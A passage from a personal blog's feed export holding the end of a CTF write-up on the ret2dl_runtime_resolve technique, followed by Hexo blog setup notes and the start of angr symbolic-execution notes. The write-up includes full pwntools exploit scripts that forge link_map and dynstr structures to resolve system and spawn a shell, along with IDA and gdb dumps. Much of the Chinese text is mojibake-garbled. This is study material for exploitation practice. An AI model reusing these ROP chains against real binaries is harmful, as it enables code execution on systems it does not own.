class="number">0xf8</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x8</span>) <span class="comment">#Set the address where DT_JMPREL is located: any readable area can be</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_addr, write_got ,l_addr)<span class="comment"># ä¼ªé€ link_map</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)\+p64(pop_rdi)+p64(bss_addr+<span class="number">0x48</span>)+p64(dl_re)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">gdb.attach(r,<span class="string">&#x27;dir /home/roo/Desktop/ret2dl/glibc-2.31/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)  </span><br><span class="line">raw_input()</span><br><span class="line">r.send(fake_link_map) </span><br><span class="line"></span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure><p>The above is just a brief introduction to the ret2dl of the program under PARTIAL_RELRO 64-bit. Of course, under 64-bit NO RELRO, the structure becomes very simple. Letâ€™s briefly introduce it.</p><p>NO RELRO</p><p>This is a direct fake dynstr that is DT_STRTAB</p><table><thead><tr><th>name</th><th>section name</th></tr></thead><tbody><tr><td>DT_STRTAB</td><td>.dynstr</td></tr><tr><td>DT_SYMTAB</td><td>.dynsym</td></tr><tr><td>DT_JMPREL</td><td>.rel.plt</td></tr></tbody></table><p>see from ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400398</span> byte_400398     db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">00000000004002</span>D8â†‘o</span><br><span class="line">LOAD:<span class="number">0000000000400398</span>                                         ; LOAD:<span class="number">00000000004002F</span>0â†‘o ...</span><br><span class="line">LOAD:<span class="number">0000000000400399</span> aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0000000000400408</span>â†“o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A3 aStdin          db <span class="string">&#x27;stdin&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">0000000000400380</span>â†‘o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A9 aStrlen         db <span class="string">&#x27;strlen&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004002F</span>0â†‘o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>0 aRead           db <span class="string">&#x27;read&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">0000000000400320</span>â†‘o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>5 aStdout         db <span class="string">&#x27;stdout&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400368</span>â†‘o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>C aSetbuf         db <span class="string">&#x27;setbuf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400308</span>â†‘o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>C3 aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>Before that, we tampered with dynamic strtable into our fake dynstr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000600E20</span> _DYNAMIC        Elf64_Dyn &lt;<span class="number">1</span>, <span class="number">1</span>&gt;        ; DATA XREF: LOAD:<span class="number">0000000000400130</span>â†‘o</span><br><span class="line">LOAD:<span class="number">0000000000600E20</span>                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_â†“o</span><br><span class="line">LOAD:<span class="number">0000000000600E20</span>                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">0000000000600E30</span>                 Elf64_Dyn &lt;<span class="number">0</span>Ch, <span class="number">4004E8</span>h&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">0000000000600E40</span>                 Elf64_Dyn &lt;<span class="number">0</span>Dh, <span class="number">4007B</span>4h&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">0000000000600E50</span>                 Elf64_Dyn &lt;<span class="number">19</span>h, <span class="number">600E10</span>h&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600E60</span>                 Elf64_Dyn &lt;<span class="number">1B</span>h, <span class="number">8</span>&gt;      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600E70</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ah, <span class="number">600E18</span>h&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600E80</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ch, <span class="number">8</span>&gt;      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600E90</span>                 Elf64_Dyn &lt;<span class="number">6F</span>FFFEF5h, <span class="number">400298</span>h&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EA0                 Elf64_Dyn &lt;<span class="number">5</span>, <span class="number">400398</span>h&gt;  ; DT_STRTAB   I see here that it points directly to dynstr, and tampered with it to where we forged</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EB0                 Elf64_Dyn &lt;<span class="number">6</span>, <span class="number">4002</span>C0h&gt;  ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EC0                 Elf64_Dyn &lt;<span class="number">0</span>Ah, <span class="number">5</span>Eh&gt;    ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">0000000000600</span>ED0                 Elf64_Dyn &lt;<span class="number">0B</span>h, <span class="number">18</span>h&gt;    ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EE0                 Elf64_Dyn &lt;<span class="number">15</span>h, <span class="number">0</span>&gt;      ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EF0                 Elf64_Dyn &lt;<span class="number">3</span>, <span class="number">601000</span>h&gt;  ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>00                 Elf64_Dyn &lt;<span class="number">2</span>, <span class="number">60</span>h&gt;      ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>10                 Elf64_Dyn &lt;<span class="number">14</span>h, <span class="number">7</span>&gt;      ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>20                 Elf64_Dyn &lt;<span class="number">17</span>h, <span class="number">400488</span>h&gt; ; DT_JMPRELc</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>30                 Elf64_Dyn &lt;<span class="number">7</span>, <span class="number">400428</span>h&gt;  ; DT_RELA</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>40                 Elf64_Dyn &lt;<span class="number">8</span>, <span class="number">60</span>h&gt;      ; DT_RELASZ</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>50                 Elf64_Dyn &lt;<span class="number">9</span>, <span class="number">18</span>h&gt;      ; DT_RELAENT</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>60                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFEh, <span class="number">400408</span>h&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>70                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFFh, <span class="number">1</span>&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>80                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFF0h, <span class="number">4003F</span>6h&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>90                 Elf64_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>Finally, letâ€™s look at the most important functions, the source code:</p><p>strtab + sym-&gt;st_name this time is pointing to our system, where we just tampered with strlen as system</p><p>Debugging is too complicated, many macro definitions, mainly as follows, directly complete the hijacking</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">  <span class="number">0x7f3ab197ac57</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">151</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac5c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">156</span>&gt;    mov    rsi, qword ptr [rcsp + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac61</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">161</span>&gt;    mov    rdx, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac66</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">166</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac6b</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;    mov    rax, qword ptr [rsp]</span><br><span class="line">â–º <span class="number">0x7f3ab197ac6f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">175</span>&gt;    mov    rsp, rbx</span><br><span class="line">  <span class="number">0x7f3ab197ac72</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;    mov    rbx, qword ptr [rsp]</span><br><span class="line">  <span class="number">0x7f3ab197ac76</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;    add    rsp, <span class="number">0x18</span></span><br><span class="line">  <span class="number">0x7f3ab197ac7a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">186</span>&gt;    bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Directly use the script of the online master as a template:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line"><span class="comment">#The target of our attack, the address of strtab in .dynamic, we have to modify it here to point to fake_dynstr</span></span><br><span class="line">target_addr = <span class="number">0x600988</span> + <span class="number">8</span>  </span><br><span class="line"><span class="comment">#The function used to load the function address, when we fake dynstr, call it again to load the function we need</span></span><br><span class="line">plt0_load = <span class="number">0x4004D0</span>   </span><br><span class="line"><span class="comment">#pop rdi;ret;  </span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span> </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x400771</span></span><br><span class="line"><span class="comment">#ä¼ªé€ dynstr  </span></span><br><span class="line">fake_dynstr = <span class="string">&#x27;\x00libc.so.6\x00stdin\x00system\x00&#x27;</span> <span class="comment">#åŸæœ¬dynsträ¸º\x00libc.so.6\x00stdin\x00strlen\x00&#x27;</span></span><br><span class="line">bss = <span class="number">0x600B30</span>  </span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> , pop_rdi , <span class="number">0</span> , pop_rsi , bss , <span class="number">0</span> , read_plt , <span class="comment"># Write &#x27;/bin/sh&#x27; and fake strtab to bss segment</span></span><br><span class="line">                pop_rdi , <span class="number">0</span> , pop_rsi , target_addr , <span class="number">0</span> , read_plt , <span class="comment"># Change the strtab address in .dynamic to the address of our fake strtab</span></span><br><span class="line">                pop_rdi , bss , plt0_load , <span class="number">1</span> <span class="comment"># Call .dl_fixup to parse the strlen function. Since we have replaced strlen with system in fake_strtab, the system function will be parsed</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">r.sendline(payload)  </span><br><span class="line"><span class="comment">#Send system parameters and fake strtab</span></span><br><span class="line">payload2 = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>) + fake_dynstr  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line">r.sendline(payload2)  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#Modify the address of strtab in dynsym to the address of our forged dynstr</span></span><br><span class="line">r.sendline(p64(bss + <span class="number">0x10</span>))  </span><br><span class="line">r.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="So-far-I-have-analyzed-the-ret2dl-of-the-64-bit-pwn-problem-If-there-is-still-time-I-will-analyze-the-32-bit-problem-I-think-32-bit-is-more-complicated-I-wrote-this-article-for-two-days"><a href="#So-far-I-have-analyzed-the-ret2dl-of-the-64-bit-pwn-problem-If-there-is-still-time-I-will-analyze-the-32-bit-problem-I-think-32-bit-is-more-complicated-I-wrote-this-article-for-two-days" class="headerlink" title="So far, I have analyzed the ret2dl of the 64-bit pwn problem. If there is still time, I will analyze the 32-bit problem. I think 32-bit is more complicated. I wrote this article for two days. ! ! !"></a>So far, I have analyzed the ret2dl of the 64-bit pwn problem. If there is still time, I will analyze the 32-bit problem. I think 32-bit is more complicated. I wrote this article for two days. ! ! !</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2-dl-runtime-resolve-x86-x64&quot;&gt;&lt;a href=&quot;#ret2-dl-runtime-resolve-x86-x64&quot; class=&quot;headerlink&quot; title=&quot;ret2_dl_runtime_resolve(x86&amp;#x</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>create_website</title>
    <link href="https://jsjsj.top/2023/10/03/create-website/"/>
    <id>https://jsjsj.top/2023/10/03/create-website/</id>
    <published>2023-10-03T14:01:04.000Z</published>
    <updated>2023-10-05T01:41:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/dxxzst/article/details/76135935">https://blog.csdn.net/dxxzst/article/details/76135935</a><br><a href="https://blog.csdn.net/wushibo123/article/details/124619123">https://blog.csdn.net/wushibo123/article/details/124619123</a><br><a href="https://huaweicloud.csdn.net/638eaae1dacf622b8df8cdee.html">https://huaweicloud.csdn.net/638eaae1dacf622b8df8cdee.html</a><br><a href="https://blog.csdn.net/weixin_43642577/article/details/126713252">https://blog.csdn.net/weixin_43642577/article/details/126713252</a><br>åˆ›å»ºé¡µé¢é…ç½®ï¼š<a href="https://blog.csdn.net/qq_59016701/article/details/132576005">https://blog.csdn.net/qq_59016701/article/details/132576005</a></p><p>é‡è¦çš„é…ç½®è¿æ¥githubï¼Œå¦‚æœæ— æ³•ç”Ÿæˆidsaï¼Œåœ¨è¿æ¥çš„æ—¶å€™ç»™å®ƒæ”¹ä¸‹</p><p><a href="https://blog.csdn.net/wushibo123/article/details/124619123">https://blog.csdn.net/wushibo123/article/details/124619123</a></p><p><a href="https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/">https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ–°å»ºæ–‡ç« hexo n æ–‡ç« å</span><br><span class="line"></span><br><span class="line">æ–°å»ºpageï¼šhexo n page about</span><br><span class="line"></span><br><span class="line">ä¸Šä¼ hexo clean  &amp;hexo s(d)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åšå®¢æ¨¡æ¿æ’ä»¶</span><br><span class="line">npm install --save hexo-theme-fluid</span><br><span class="line">å®‰è£…åˆ°äº†node_modulesæ–‡ä»¶ä¸‹çš„hexo-theme-fluidï¼Œå°†æ–‡ä»¶é‡Œçš„cofig.ymlé…ç½®æ–‡ä»¶æ‹·è´åˆ°blogæ ¹ç›®å½•ä¸‹æ”¹æˆ_config.fluid.ymlï¼Œç„¶ååœ¨æ ¹ç›®å½•ä¸‹_config.ymlï¼ŒæŒ‡å®šä¸»é¢˜ç±»å‹ä¸ºtheme: fluidå³å¯</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">éšè—æ–‡ç« </span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">æ–‡ç« æ ‡é¢˜</span></span><br><span class="line"><span class="attr">index_img:</span> <span class="string">/img/example.jpg</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-10-10 10:00:00</span></span><br><span class="line"><span class="attr">hide:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">ä»¥ä¸‹æ˜¯æ–‡ç« å†…å®¹</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">å½’æ¡£æ–‡ç« </span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">æ–‡ç« æ ‡é¢˜</span></span><br><span class="line"><span class="attr">index_img:</span> <span class="string">/img/example.jpg</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-10-10 10:00:00</span></span><br><span class="line"><span class="attr">archive:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">ä»¥ä¸‹æ˜¯æ–‡ç« å†…å®¹</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ è¯„è®ºï¼š<a href="https://blog.csdn.net/m0_51321469/article/details/127174188">https://blog.csdn.net/m0_51321469/article/details/127174188</a></p><p><a href="https://valine.js.org/quickstart.html">https://valine.js.org/quickstart.html</a></p><p>hexo new page about&#x2F;friends</p><p> â€” title: ç½®é¡¶æ–‡ç«  </p><p>sticky: true â€”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/dxxzst/article/details/76135935&quot;&gt;https://blog.csdn.net/dxxzst/article/details/76135935&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;htt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰</title>
    <link href="https://jsjsj.top/2022/12/03/CTF%20Angr%20%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/"/>
    <id>https://jsjsj.top/2022/12/03/CTF%20Angr%20%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-12-03T14:17:58.000Z</published>
    <updated>2023-10-04T06:36:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰"><a href="#CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰" class="headerlink" title="CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰"></a>CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰</h1><h2 id="å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†"><a href="#å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†" class="headerlink" title="å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†"></a>å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†</h2><h2 id="ä¸€ã€00"><a href="#ä¸€ã€00" class="headerlink" title="ä¸€ã€00"></a>ä¸€ã€00</h2><p>æˆ‘ä»¬è¦ç”¨åˆ°ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªangrå’Œä¸€ä¸ªsys</p><p>angrè¿›è¡Œç¬¦å·æ‰§è¡Œï¼Œsysæ¥è¿›è¡Œç”¨æˆ·è¾“å…¥è¾“å‡º</p><p>æˆ‘ä»¬ç¬¬ä¸€æ­¥è¦è¿›è¡Œangrè„šæœ¬å»è·‘çº¦æŸé€†å‘çš„æ—¶å€™ï¼Œ</p><p>ç¬¬ä¸€æ­¥ï¼š</p><p>1.åˆ›å»ºæ–‡ä»¶é¡¹ç›®ï¼š</p><p>proj&#x3D;angr.Project(binary,auto_load_libs&#x3D;False)ï¼Œä¸åŠ è½½libc</p><p>2.åˆå§‹åŒ–åœ°å€å— </p><p>state&#x3D;proj.factory.entry_state()   è¿™é‡Œçš„å—åˆå§‹åŒ–åˆ°äº†ç¨‹åºçš„start 